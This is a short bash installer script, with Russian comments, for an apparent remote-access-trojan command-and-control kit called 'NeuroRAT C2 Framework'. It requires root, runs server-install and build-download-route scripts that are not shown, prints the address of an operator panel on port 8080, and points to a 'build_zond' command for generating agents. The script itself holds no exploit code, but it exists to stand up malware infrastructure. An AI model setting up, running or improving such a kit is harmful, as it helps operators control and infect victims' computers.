#!/bin/bash

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Проверка прав root
if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}Запустите скрипт с правами суперпользователя (root)${NC}"
  exit 1
fi

echo -e "${BLUE}====== Установка NeuroRAT C2 Framework ======${NC}"

# Запускаем установку сервера
echo -e "${YELLOW}Запуск установки сервера...${NC}"
bash ./install_server.sh

# Добавляем маршрут скачивания билдов
echo -e "${YELLOW}Добавление маршрута скачивания...${NC}"
bash ./download_route_patch.sh

SERVER_IP=$(curl -s https://ipinfo.io/ip)

echo -e "${GREEN}====== Установка завершена! ======${NC}"
echo -e "${GREEN}Доступ к панели: http://${SERVER_IP}:8080${NC}"
echo -e "${YELLOW}Для создания агента выполните команду: build_zond${NC}"
